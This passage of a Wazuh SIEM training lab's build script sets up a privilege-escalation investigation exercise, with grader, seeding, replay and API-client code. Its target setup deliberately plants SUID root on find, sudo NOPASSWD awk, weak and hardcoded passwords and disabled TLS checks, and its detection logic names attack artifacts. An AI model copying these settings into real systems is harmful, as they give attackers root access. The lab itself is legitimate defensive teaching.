    if "COMMAND=/usr/bin/awk" in fl and "sudo" in fl:
        return 3
    if path.startswith("/tmp/.") or ("syscheck" in groups and "/tmp/." in fl):
        return 4
    if rid == "100300" or "new user" in fl and "UID=0" in fl or path.startswith(
            ("/etc/passwd", "/root/.ssh", "/usr/local/bin/.", "/etc/cron.d/sysbackup")):
        return 5
    if "Accepted publickey for root" in fl and ("from " + ATTACKER + " ") in fl:
        return 6
    return None


def do_cover():
    alerts = []
    try:
        with open(ALERTS, errors="ignore") as f:
            for ln in f:
                try:
                    alerts.append(json.loads(ln))
                except ValueError:
                    pass
    except OSError:
        pass
    # moc cat: 2 phut sau khi ke tan cong quay lai (giai doan 6) -> bo qua hanh dong cua SV ve sau
    t6 = [_ts(a) for a in alerts if stage_of(a) == 6]
    cutoff = (min(t6) + 120) if t6 else None
    seen = [False] * 7
    stage_seen = [False] * 7
    for a in alerts:
        st = stage_of(a)
        if st is None or (cutoff and _ts(a) > cutoff):
            continue
        stage_seen[st] = True
        rule = a.get("rule") or {}
        try:
            rid, lvl = int(rule.get("id", 0)), int(rule.get("level", 0))
        except ValueError:
            continue
        if lvl >= 10 and not (STUDENT_LO <= rid <= STUDENT_HI):
            seen[st] = True
    gt = "".join("1" if s else "0" for s in seen)
    out = ["GT_COVER=%s" % gt, "CHAIN_STAGES_SEEN=%s" % "".join("1" if s else "0" for s in stage_seen)]
    if gt == DESIGN:
        out.append("COVER_DESIGN_OK")
    return "\n".join(out) + "\n"


def do_print():
    p = os.path.join(ST, "rules.txt")
    txt = open(p).read() if os.path.exists(p) else ""
    if "RULES_SHA=%s" % rules_sha() not in txt:
        print("RULES_STALE")
    print(txt.strip())
    print(do_cover().strip())


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "print"
    if cmd == "rules":
        do_rules(settle=int(sys.argv[2]) if len(sys.argv) > 2 else 20)
    elif cmd == "cover":
        print(do_cover(), end="")
    else:
        do_print()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/bai17"
cat > "$LAB/siem/bai17/seed17.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# seed17.py - khoi tao siem cho Bai 17. Chay BOI SYSTEMD (seed-bai17.service) luc boot, quyen root.
# (Tren anh chung soc-wazuh, hook fixlocal/parameter cua Labtainers BI BO QUA -> moi viec o day.)
#
#   1) Cai bo luat "nguyen trang" bo sung: luat san xuat 100300, decoder con sudo.program,
#      khai bao 3 CDB list (rong) trong ossec.conf -> restart manager.
#   2) Tao user API 'soc-tool' (cong cu kiem-thu-luat / thu-dong tren defender dung).
#   3) Sinh TAP KIEM TRA AN (self-random) -> /root/.bai17/hidden.jsonl, kiem bat bien.
#   4) Tu kiem decoder (logtest 1 dong sudo) -> DECODER_OK / DECODER_FAIL.
#   5) Ghi marker /root/.bai17/seeded (prestop doc). Chay lai: bo qua neu da co marker.
# ============================================================================
import glob, json, os, re, shutil, subprocess, sys, time

HERE = "/home/ubuntu/bai17"
sys.path.insert(0, os.path.join(HERE, "lib"))
from wzapi import Wazuh, WazuhError  # noqa: E402

ST = "/root/.bai17"
MARK = os.path.join(ST, "seeded")
OSSEC = "/var/ossec"
LISTS = ["gtfo-shell", "sudo-approved", "admin-hosts"]
TOOL_USER, TOOL_PASS = "soc-tool", "Soc.Tool.2026!"
LOG = os.path.join(ST, "seed.log")


def log(msg):
    with open(LOG, "a") as f:
        f.write("%s %s\n" % (time.strftime("%H:%M:%S"), msg))


def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)


def wui_creds():
    """Tai khoan API ma dashboard dang dung (anh chung khong con file mat khau cai dat)."""
    for p in glob.glob("/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml"):
        txt = open(p).read()
        u = re.search(r"username:\s*['\"]?([^'\"\n]+)", txt)
        pw = re.search(r"password:\s*['\"]?([^'\"\n]+)", txt)
        if u and pw:
            return u.group(1).strip(), pw.group(1).strip()
    return None, None


SUDO_DEC = "0320-sudo_decoders.xml"
CMD_RE = re.compile(r'<regex offset="after_regex">COMMAND=\(\\\.\+\)</regex>(\s*)<order>command</order>')
CMD_NEW = r'<regex type="pcre2" offset="after_regex">COMMAND=((\\S+).*)</regex>\1<order>command, sudo.program</order>'


def override_sudo_decoder():
    """Wazuh 4.14: decoder sudo goc la chuoi decoder anh em noi tiep (offset after_regex), decoder
    cuoi COMMAND=(\\.+) an het dong -> decoder anh em them o file khac khong duoc chay.
    Cach chuan cua Wazuh: chep file goc sang etc/decoders, sua, va decoder_exclude file goc.
    Sua: tach COMMAND bang pcre2 2 nhom -> command (giu nguyen nhu cu) + sudo.program (duong dan)."""
    src = OSSEC + "/ruleset/decoders/" + SUDO_DEC
    txt = open(src).read()
    new, n = CMD_RE.subn(CMD_NEW, txt)
    log("decoder sudo: sua %d cho COMMAND" % n)
    if n == 0:
        return False
    hdr = "<!-- Bai 17: ban sua cua %s - them truong sudo.program (duong dan chuong trinh, khong kem tham so) -->\n" % SUDO_DEC
    open(OSSEC + "/etc/decoders/" + SUDO_DEC, "w").write(hdr + new)
    return True


def install_ruleset():
    shutil.copy(os.path.join(HERE, "bai17_prod_rules.xml"), OSSEC + "/etc/rules/bai17_prod_rules.xml")
    if os.path.exists(OSSEC + "/etc/decoders/bai17_decoders.xml"):
        os.remove(OSSEC + "/etc/decoders/bai17_decoders.xml")   # ban cu (decoder anh em) khong chay
    dec_ok = override_sudo_decoder()
    for n in LISTS:
        p = OSSEC + "/etc/lists/" + n
        if not os.path.exists(p):
            open(p, "w").write("lab-placeholder:\n")
    conf = open(OSSEC + "/etc/ossec.conf").read()
    add = "".join("    <list>etc/lists/%s</list>\n" % n for n in LISTS if "etc/lists/%s<" % n not in conf)
    excl = "<decoder_exclude>ruleset/decoders/%s</decoder_exclude>" % SUDO_DEC
    if dec_ok and excl not in conf:
        add += "    %s\n" % excl
    if add:
        conf = conf.replace("<ruleset>", "<ruleset>\n" + add.rstrip("\n"), 1)
        open(OSSEC + "/etc/ossec.conf", "w").write(conf)
    sh("chown -R wazuh:wazuh %s/etc/rules %s/etc/decoders %s/etc/lists 2>/dev/null" % (OSSEC, OSSEC, OSSEC))
    sh("chmod 660 %s/etc/rules/*.xml %s/etc/decoders/*.xml 2>/dev/null" % (OSSEC, OSSEC))
    api_timeout()
    t = sh(OSSEC + "/bin/wazuh-analysisd -t")
    log("kiem tra cau hinh analysisd rc=%s %s" % (t.returncode, (t.stdout + t.stderr).strip()[-300:]))
    if t.returncode != 0:
        # cau hinh hong -> go phan minh them, khong de manager chet
        # go ban sua decoder + decoder_exclude -> quay ve decoder goc
        if os.path.exists(OSSEC + "/etc/decoders/" + SUDO_DEC):
            os.remove(OSSEC + "/etc/decoders/" + SUDO_DEC)
        c = open(OSSEC + "/etc/ossec.conf").read()
        c = re.sub(r"\s*<decoder_exclude>ruleset/decoders/%s</decoder_exclude>" % re.escape(SUDO_DEC), "", c)
        open(OSSEC + "/etc/ossec.conf", "w").write(c)
        log("analysisd -t loi -> da go ban sua decoder sudo, thu lai")
        t = sh(OSSEC + "/bin/wazuh-analysisd -t")
        log("kiem tra lan 2 rc=%s %s" % (t.returncode, (t.stdout + t.stderr).strip()[-300:]))
    restart_manager()


def api_timeout():
    """Mac dinh API cat yeu cau sau 10s (loi 3021). Tren VM tai nang, kiem tra cau hinh/logtest
    hay vuot 10s -> nang len 60s. Co hieu luc sau lan restart manager ngay sau day."""
    p = OSSEC + "/api/configuration/api.yaml"
    try:
        txt = open(p).read()
    except OSError:
        return
    if re.search(r"^\s*request_timeout:", txt, re.M):
        txt = re.sub(r"^(\s*request_timeout:).*$", r"\1 60", txt, flags=re.M)
    elif re.search(r"^intervals:\s*$", txt, re.M):
        txt = re.sub(r"^intervals:\s*$", "intervals:\n  request_timeout: 60", txt, count=1, flags=re.M)
    else:
        txt = txt.rstrip("\n") + "\n\nintervals:\n  request_timeout: 60\n"
    open(p, "w").write(txt)
    log("api.yaml: request_timeout=60")


def restart_manager():
    """VM tai nang luc boot (indexer + dashboard cung khoi dong) -> systemd hay timeout.
    Thu toi da 3 lan; lan sau dung wazuh-control truc tiep, khong qua gioi han cua systemd."""
    for i in range(3):
        cmd = "systemctl restart wazuh-manager" if i == 0 else \
              "systemctl reset-failed wazuh-manager; %s/bin/wazuh-control restart" % OSSEC
        r = sh(cmd)
        st = sh(OSSEC + "/bin/wazuh-control status").stdout
        log("restart lan %d rc=%s %s" % (i + 1, r.returncode, r.stderr.strip()[:150]))
        if "wazuh-apid is running" in st and "wazuh-analysisd is running" in st:
            return True
        time.sleep(20)
    log("manager van chua chay du:\n" + st)
    return False


def wait_api(user, pw, tries=60):
    for _ in range(tries):
        try:
            api = Wazuh("https://127.0.0.1:55000", user, pw)
            api.login()
            return api
        except WazuhError:
            time.sleep(5)
    return None


def create_tool_user(api):
    r = api._req("GET", "/security/users", params={"search": TOOL_USER})
    items = (r.get("data") or {}).get("affected_items") or []
    uid = next((it["id"] for it in items if it.get("username") == TOOL_USER), None)
    if uid is None:
        r = api._req("POST", "/security/users", body={"username": TOOL_USER, "password": TOOL_PASS})
        uid = r["data"]["affected_items"][0]["id"]
    else:
        api._req("PUT", "/security/users/%s" % uid, body={"password": TOOL_PASS})
    # vai tro administrator (id 1): du quyen ruleset + logtest + restart. Tap kiem tra an nam o
    # he thong file siem (khong qua API) nen khong lo qua tai khoan nay.
    try:
        api._req("POST", "/security/users/%s/roles" % uid, params={"role_ids": "1"})
    except WazuhError as e:
        log("gan role: %s" % e)
    log("user API %s id=%s" % (TOOL_USER, uid))


def decoder_selftest(api):
    line = "Nov 20 10:00:00 target sudo:  emp1234 : TTY=pts/0 ; PWD=/home/emp1234 ; USER=root ; COMMAND=/usr/bin/awk BEGIN {x}"
    tok, out = api.logtest(line)
    api.logtest_close(tok)
    data = out.get("data") or {}
    prog = (data.get("sudo") or {}).get("program") if isinstance(data.get("sudo"), dict) else data.get("sudo.program")
    has_user = bool(out.get("srcuser") or data.get("srcuser"))
    log("selftest decoder: program=%r srcuser=%r" % (prog, has_user))
    return prog == "/usr/bin/awk" and has_user


def main():
    os.makedirs(ST, exist_ok=True)
    os.chmod(ST, 0o700)
    if os.path.exists(MARK):
        return
    log("bat dau seed")
    u, pw = wui_creds()
    log("tai khoan dashboard: %s" % (u or "KHONG TIM THAY wazuh.yml"))
    # cho manager khoi dong xong lan dau truoc khi sua cau hinh (tranh restart chong len luc boot)
    if u and wait_api(u, pw, tries=60) is None:
        log("API chua len sau 5 phut tu luc boot")
    install_ruleset()
    api = wait_api(u, pw, tries=72) if u else None
    if api is None:
        log("KHONG dang nhap duoc API bang tai khoan dashboard")
        open(MARK, "w").write("SEED=PARTIAL\nAPI_USER=FAIL\n")
        return
    create_tool_user(api)
    tool = wait_api(TOOL_USER, TOOL_PASS, tries=12)

    hid = os.path.join(ST, "hidden.jsonl")
    r = sh("python3 %s/gen17.py --set hidden --out %s && python3 %s/gen17.py --check %s" % (HERE, hid, HERE, hid))
    log("sinh tap an: rc=%s %s" % (r.returncode, (r.stdout + r.stderr).strip()[:300]))

    # ngay sau restart, logtest hay tra 500 "Timeout executing API request" (analysisd chua nap xong)
    dec_ok = False
    for i in range(8):
        try:
            dec_ok = decoder_selftest(tool or api)
            break
        except WazuhError as e:
            log("selftest lan %d loi: %s" % (i + 1, str(e)[:160]))
            time.sleep(15)
    open(MARK, "w").write("SEED=OK\nAPI_USER=%s\nHIDDEN=%s\nDECODER=%s\n" % (
        "OK" if tool else "FAIL", "OK" if r.returncode == 0 else "FAIL", "OK" if dec_ok else "FAIL"))
    log("xong")


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/bai17/lib"
cat > "$LAB/siem/bai17/lib/replay.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# replay.py - phat lai bo kich ban log (JSONL) qua Wazuh logtest, dem TP/FP/FN theo ho luat.
# Ha tang DUNG CHUNG (Bai 16, 17, 18). Xem README.md cung thu muc.
#
# Dinh dang moi dong JSONL:
#   {"id": "l1-m-03", "family": "l1", "label": "mal"|"benign", "variant": "...",
#    "window_s": 600, "lines": ["<dong syslog 1>", "<dong syslog 2>", ...]}
#
# Quy uoc dem (theo KICH BAN, khong theo dong log):
#   - Moi kich ban = 1 phien logtest rieng (token rieng) -> luat tan suat co trang thai trong phien.
#   - Kich ban DUONG TINH neu co >= 1 dong sinh canh bao level >= MIN_LEVEL
#     voi rule.id nam trong dai ID cua ho do.
#   - mal & duong tinh = TP ; mal & am tinh = FN ; benign & duong tinh = FP.
#   - Luat im lang hoan toan: precision = 0 (quy uoc), recall = 0.
#
# Dung:
#   replay.py --set dev.jsonl --ranges l1=100270-100279,l2=100280-100289 [--mode dev|grade|json]
# ============================================================================
import argparse, json, sys

MIN_LEVEL = 10


def load_set(path):
    out = []
    with open(path, encoding="utf-8") as f:
        for ln in f:
            ln = ln.strip()
            if ln:
                out.append(json.loads(ln))
    return out


def parse_ranges(s):
    rng = {}
    for part in (s or "").split(","):
        part = part.strip()
        if not part:
            continue
        fam, span = part.split("=")
        lo, hi = span.split("-")
        rng[fam.strip()] = (int(lo), int(hi))
    return rng


def scenario_hits(engine, sc, lo, hi, min_level=MIN_LEVEL):
    """engine(event, token) -> (token, output). Tra ve danh sach (rule_id, level) da no trong dai."""
    hits = []
    token = None
    try:
        for line in sc["lines"]:
            token, out = engine(line, token)
            rule = (out or {}).get("rule") or {}
            try:
                rid = int(rule.get("id", -1))
                lvl = int(rule.get("level", 0))
            except (TypeError, ValueError):
                continue
            if lo <= rid <= hi and lvl >= min_level:
                hits.append((rid, lvl))
    finally:
        if hasattr(engine, "close"):
            engine.close(token)
    return hits


def run(engine, scenarios, ranges):
    res = {}
    for fam, (lo, hi) in ranges.items():
        r = {"tp": 0, "fp": 0, "fn": 0, "tn": 0, "fp_ids": [], "fn_ids": [], "n_mal": 0, "n_benign": 0}
        for sc in scenarios:
            if sc.get("family") != fam:
                continue
            pos = bool(scenario_hits(engine, sc, lo, hi))
            mal = sc.get("label") == "mal"
            if mal:
                r["n_mal"] += 1
                if pos:
                    r["tp"] += 1
                else:
                    r["fn"] += 1
                    r["fn_ids"].append(sc["id"])
            else:
                r["n_benign"] += 1
                if pos:
                    r["fp"] += 1
                    r["fp_ids"].append(sc["id"])
                else:
                    r["tn"] += 1
        r["precision"] = (r["tp"] / (r["tp"] + r["fp"])) if (r["tp"] + r["fp"]) else 0.0
        r["recall"] = (r["tp"] / r["n_mal"]) if r["n_mal"] else 0.0
        res[fam] = r
    return res


class ApiEngine:
    """Bo phat lai that: goi Wazuh API /logtest."""

    def __init__(self, api):
        self.api = api

    def __call__(self, event, token):
        return self.api.logtest(event, token)

    def close(self, token):
        self.api.logtest_close(token)


def print_dev(res):
    print("%-5s %4s %4s %4s  %-9s %-6s" % ("HO", "TP", "FP", "FN", "PRECISION", "RECALL"))
    for fam, r in res.items():
        print("%-5s %4d %4d %4d  %-9.2f %-6.2f" % (fam, r["tp"], r["fp"], r["fn"], r["precision"], r["recall"]))
    for fam, r in res.items():
        if r["fp_ids"]:
            print("  [%s] kich ban BAO GIA (FP): %s" % (fam, ", ".join(r["fp_ids"])))
        if r["fn_ids"]:
            print("  [%s] kich ban BO SOT (FN): %s" % (fam, ", ".join(r["fn_ids"])))


def main():
    ap = argparse.ArgumentParser(description="Phat lai kich ban log qua Wazuh logtest")
    ap.add_argument("--set", required=True, help="file JSONL kich ban")
    ap.add_argument("--ranges", required=True, help="ho=tu-den,... vd l1=100270-100279")
    ap.add_argument("--mode", default="dev", choices=["dev", "grade", "json"])
    a = ap.parse_args()

    sys.path.insert(0, __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
    from wzapi import Wazuh
    res = run(ApiEngine(Wazuh()), load_set(a.set), parse_ranges(a.ranges))
    if a.mode == "dev":
        print_dev(res)
    elif a.mode == "json":
        print(json.dumps(res))
    else:
        for fam, r in res.items():
            print("%s_TP=%d %s_FP=%d %s_FN=%d" % (fam.upper(), r["tp"], fam.upper(), r["fp"], fam.upper(), r["fn"]))


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/siem/bai17/lib"
cat > "$LAB/siem/bai17/lib/wzapi.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# wzapi.py - client toi gian cho Wazuh API (cong 55000). Chi dung thu vien chuan.
# Dung chung cho: kiem-thu-luat, thu-dong, replay.py (defender) va grade (siem).
#
# Cau hinh (bien moi truong, co mac dinh cho lab):
#   WZ_API_URL   (mac dinh https://172.20.0.20:55000)
#   WZ_API_USER  (mac dinh bai17-tool)
#   WZ_API_PASS  (mac dinh xem DEFAULT_PASS)
# ============================================================================
import base64, json, os, ssl, time, urllib.error, urllib.parse, urllib.request

DEFAULT_URL = "https://172.20.0.20:55000"
DEFAULT_USER = "soc-tool"
DEFAULT_PASS = "Soc.Tool.2026!"

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


class WazuhError(Exception):
    pass


class Wazuh:
    def __init__(self, url=None, user=None, password=None, timeout=30):
        self.url = (url or os.environ.get("WZ_API_URL") or DEFAULT_URL).rstrip("/")
        self.user = user or os.environ.get("WZ_API_USER") or DEFAULT_USER
        self.password = password or os.environ.get("WZ_API_PASS") or DEFAULT_PASS
        self.timeout = timeout
        self.token = None

    # ---------------- tang thap ----------------
    def _req(self, method, path, body=None, raw=None, ctype="application/json", auth=True, params=None, _try=0):
        url = self.url + path
        if params:
            url += "?" + urllib.parse.urlencode(params)
        data = None
        if raw is not None:
            data = raw if isinstance(raw, bytes) else raw.encode("utf-8")
        elif body is not None:
            data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Content-Type", ctype)
        if auth:
            if not self.token:
                self.login()
            req.add_header("Authorization", "Bearer " + self.token)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                txt = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            txt = e.read().decode("utf-8", "replace")
            if e.code == 401 and auth and self.token:
                # token het han -> dang nhap lai 1 lan
                self.token = None
                return self._req(method, path, body, raw, ctype, auth, params)
            if e.code == 500 and '"error": 3021' in txt and _try < 3:
                # 3021 = "Timeout executing API request": may ao qua tai, manager cham -> thu lai
                time.sleep(5 * (_try + 1))
                return self._req(method, path, body, raw, ctype, auth, params, _try + 1)
            raise WazuhError("HTTP %s %s %s: %s" % (e.code, method, path, txt[:400]))
        except Exception as e:
            raise WazuhError("%s %s: %s" % (method, path, e))
        try:
            return json.loads(txt) if txt else {}
        except ValueError:
            return {"raw": txt}

    def login(self):
        url = self.url + "/security/user/authenticate"
        req = urllib.request.Request(url, data=b"", method="POST")
        cred = base64.b64encode(("%s:%s" % (self.user, self.password)).encode()).decode()
        req.add_header("Authorization", "Basic " + cred)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                self.token = json.loads(r.read().decode())["data"]["token"]
        except urllib.error.HTTPError as e:
            raise WazuhError("Dang nhap API that bai (HTTP %s) - API chua san sang hoac sai tai khoan" % e.code)
        except Exception as e:
            raise WazuhError("Khong ket noi duoc Wazuh API %s: %s" % (self.url, e))
        return self.token

    # ---------------- ruleset ----------------
    def get_rule_file(self, name):
        r = self._req("GET", "/rules/files/" + name, params={"raw": "true"})
        return r.get("raw", "") if isinstance(r, dict) else r

    @staticmethod
    def _check_items(r, what):
        """API tra HTTP 200 ca khi KHONG ghi duoc file: loi nam trong data.failed_items."""
        d = (r or {}).get("data") or {}
        fails = d.get("failed_items") or []
        if fails or (d.get("total_affected_items") == 0 and "affected_items" in d):
            raise WazuhError("Wazuh KHONG ghi %s: %s" % (what, json.dumps(fails or r, ensure_ascii=False)[:500]))
        return r

    def put_rule_file(self, name, content):
        return self._check_items(self._req("PUT", "/rules/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    def put_list_file(self, name, content):
        return self._check_items(self._req("PUT", "/lists/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    # ---------------- manager ----------------
    def validate(self):
        """Tra ve (ok, thong_bao)."""
        r = self._req("GET", "/manager/configuration/validation")
        items = (r.get("data") or {}).get("affected_items") or []
        for it in items:
            if it.get("status") != "OK":
                return False, json.dumps(it.get("details", it), ensure_ascii=False)[:800]
        fails = (r.get("data") or {}).get("failed_items") or []
        if fails:
            return False, json.dumps(fails, ensure_ascii=False)[:800]
        return True, "OK"

    def restart(self, wait=240):
        """PUT /manager/restart chi XEP LICH restart (bat dong bo): vai giay dau /manager/status van
        bao tien trinh CU 'running' -> neu tra ve luc do, phat lai se chay tren bo luat CU.
        Phai thay manager XUONG (API mat ket noi / analysisd khong running) roi moi cho no LEN lai."""
        self._req("PUT", "/manager/restart")
        t0 = time.time()
        seen_down = False
        while time.time() - t0 < wait:
            time.sleep(3)
            try:
                self.token = None
                st = self._req("GET", "/manager/status")
                items = (st.get("data") or {}).get("affected_items") or [{}]
                up = items[0].get("wazuh-analysisd") == "running"
            except WazuhError:
                up = False
            if not up:
                seen_down = True
            elif seen_down or time.time() - t0 > 60:
                # da thay xuong roi len (hoac qua 60s ma khong bat duoc luc xuong) -> cho analysisd nap xong
                time.sleep(10)
                return True
        return False

    # ---------------- logtest ----------------
    def logtest(self, event, token=None, location="/var/log/auth.log", log_format="syslog"):
        body = {"event": event, "log_format": log_format, "location": location}
        if token:
            body["token"] = token
        r = self._req("PUT", "/logtest", body=body)
        d = r.get("data") or {}
        return d.get("token"), d.get("output") or {}

    def logtest_close(self, token):
        if not token:
            return
        try:
            self._req("DELETE", "/logtest/sessions/" + token)
        except WazuhError:
            pass
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/target"
cat > "$LAB/target/ops-noise.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# ops-healthcheck (Bai 17) - NHIEU LANH dinh ky tren target (cron moi 3 phut, quyen root).
# Muc dich: timeline khong "sach" mot cach gia tao + nen bao gia cho 3 luat lap lo hong.
#  - Nhan vien go nham mat khau tu may noi bo khac (IP 172.20.0.6x - khong co container that,
#    nen dong log duoc ghi qua logger voi tag sshd[...] -> Wazuh giai ma nhu sshd that).
#  - deploy dung quyen sudo DA DUYET (that).
#  - Quan tri vien dang nhap root bang key tu may chu quan tri DA DUYET (172.20.0.41/42).
#  - Admin tao 1 tai khoan thuong (1 lan duy nhat).
# KHONG dung IP ke tan cong (172.20.0.5) -> khong lam nhieu dap an timeline.
P() { echo $((RANDOM % 50000 + 1200)); }
PORT() { echo $((RANDOM % 28000 + 32768)); }
ip_staff() { echo "172.20.0.$((60 + RANDOM % 9))"; }
staff_user() { getent passwd | awk -F: '$1 ~ /^emp[0-9]+$/ {print $1}' | shuf -n1; }
auth() { logger -p auth.info -t "sshd[$(P)]" "$1"; }

case $((RANDOM % 4)) in
  0)  U=$(staff_user); IP=$(ip_staff)
      [ -n "$U" ] || exit 0
      for i in $(seq 1 $((1 + RANDOM % 3))); do
        auth "Failed password for $U from $IP port $(PORT) ssh2"; sleep $((2 + RANDOM % 8))
      done
      auth "Accepted password for $U from $IP port $(PORT) ssh2" ;;
  1)  su deploy -s /bin/bash -c "sudo -n $(command -v systemctl) restart nginx" >/dev/null 2>&1 ;;
  2)  ADM="172.20.0.4$((1 + RANDOM % 2))"
      auth "Accepted publickey for root from $ADM port $(PORT) ssh2: ED25519 SHA256:$(head -c 32 /dev/urandom | base64 | tr -d '=\n' | head -c 43)" ;;
  3)  if [ ! -f /var/lib/ops-intern.done ]; then
        useradd -m -s /bin/bash "intern$((100 + RANDOM % 900))" 2>/dev/null; touch /var/lib/ops-intern.done
      else
        U=$(staff_user); [ -n "$U" ] && auth "Accepted password for $U from $(ip_staff) port $(PORT) ssh2"
      fi ;;
esac
exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
# Thiet lap: foothold emp<EMPNUM> (ca nhan hoa) + 2 duong leo quyen + FIM + ground-truth.
PW="$1"
VICTIM=empEMPNUM; VPW=Password123

# ============ 1) Foothold: tai khoan bi chiem (ca nhan hoa, mat khau yeu) ============
echo "$PW" | sudo -S useradd -m -s /bin/bash "$VICTIM" 2>/dev/null
echo "$PW" | sudo -S bash -c "echo '$VICTIM:$VPW' | chpasswd"
echo "$PW" | sudo -S sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
# GIU PermitRootLogin mac dinh (prohibit-password) - thuc te. Ke tan cong quay lai bang SSH KEY
# (prohibit-password van cho root dang nhap bang key), con tin hieu dinh ky do cronjob tao ra.
echo "$PW" | sudo -S service ssh restart 2>/dev/null || echo "$PW" | sudo -S systemctl restart ssh 2>/dev/null || true
# Bao dam rsyslog chay -> auth.log ghi day du (Accepted/sudo/new user) cho timeline & SIEM
echo "$PW" | sudo -S service rsyslog start 2>/dev/null || echo "$PW" | sudo -S systemctl start rsyslog 2>/dev/null || true

# ============ 2) LO HONG 1: SUID root tren /usr/bin/find ============
echo "$PW" | sudo -S chmod u+s /usr/bin/find

# ============ 3) LO HONG 2: sudo NOPASSWD awk cho tai khoan bi chiem ============
echo "$PW" | sudo -S bash -c "echo '$VICTIM ALL=(ALL) NOPASSWD: /usr/bin/awk' > /etc/sudoers.d/$VICTIM; chmod 440 /etc/sudoers.d/$VICTIM"

# ============ 4) Ground-truth cho grader (chi root doc) - ten ca nhan hoa ============
echo "$PW" | sudo -S bash -c "printf 'ACCT=%s\nBACKDOOR=%s\n' '$VICTIM' 'svc-EMPNUM' > /root/.soc_truth; chmod 600 /root/.soc_truth"

# ============ 5) Wazuh FIM: giam sat /etc/passwd, /etc/sudoers.d, /root, /tmp realtime ============
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/etc/passwd,/etc/sudoers.d,/etc/cron.d,/root,/tmp,/usr/local/bin</directories>'
echo "$PW" | sudo -S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# ============ 6) Tai khoan analyst cho DEFENDER SSH sang ung pho ============
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA SU CO - dien gia tri ban TU TIM DUOC (giu dinh dang KEY=value):
# -- Danh tinh (dung ten/IP THAT tren he thong cua ban) --
COMPROMISED=
IP_KE_TAN_CONG=
# -- Chuoi tan cong (neu RO CO CHE, khong chi 1 tu) --
# VECTOR1 vd: "SUID /usr/bin/find"   (phai neu 'find' VA dau hieu SUID)
# VECTOR2 vd: "sudo NOPASSWD awk"    (phai neu 'sudo' VA 'awk')
VECTOR1=
VECTOR2=
BACKDOOR=
# -- Timeline (dang HH:MM) - PHAI KHOP GIO THAT trong auth.log/SIEM (cham dung sai +-1 phut) --
# 3 moc xay ra o 3 thoi diem KHAC NHAU (cach nhau ~2'): dang nhap -> leo quyen -> cai backdoor.
TIME_ACCESS=
TIME_ESCALATION=
TIME_PERSIST=
FND
echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt

# ######################################################################################
# ===================== BAI 17 - PHAN MO RONG (noi them, khong sua khoi goc) =====================
# Tham so ca nhan hoa (parameter.config): NSPRAY (10-14), HVAR (1-2), EDVAR (1-3).
# ######################################################################################
NSP=NSPRAY

# ============ 7) Tai khoan moi cho dot do mat khau (phai TON TAI -> auth.log ghi 'Failed password') ============
# Cong thuc ten DUNG CHUNG voi attacker/attack.sh (khong can truyen du lieu giua 2 may).
decoy_list() {
  local n=$1 k=1 got=0 name
  while [ "$got" -lt "$n" ]; do
    name=$(printf 'emp%04d' $(( (EMPNUM + k*37) % 9000 + 1000 )))
    k=$((k+1))
    [ "$name" = "$VICTIM" ] && continue
    echo "$name"; got=$((got+1))
  done
}
for u in $(decoy_list $((NSP - 1))); do
  echo "$PW" | sudo -S useradd -m -s /bin/bash "$u" 2>/dev/null
  RP=$(head -c 18 /dev/urandom | base64 | tr -dc 'A-Za-z0-9' | head -c 16)
  echo "$PW" | sudo -S bash -c "echo '$u:${RP}Aa9!' | chpasswd"
done

# ============ 8) Ground-truth bo sung (chi root doc) ============
echo "$PW" | sudo -S bash -c "echo 'N_SPRAY=$NSP' >> /root/.soc_truth"

# ============ 9) User deploy: sudo DA DUYET (systemctl) + H2 = 1 dong toi trinh soan thao/xem file ============
case "EDVAR" in 1) ED=/usr/bin/vim ;; 2) ED=/usr/bin/nano ;; *) ED=/usr/bin/less ;; esac
SC=$(command -v systemctl || echo /usr/bin/systemctl)
echo "$PW" | sudo -S useradd -m -s /bin/bash deploy 2>/dev/null
echo "$PW" | sudo -S bash -c "printf '%s\n%s\n' \
 '# Quyen van hanh da duyet (xem danh muc sudo-da-duyet) - KHONG duoc xoa' \
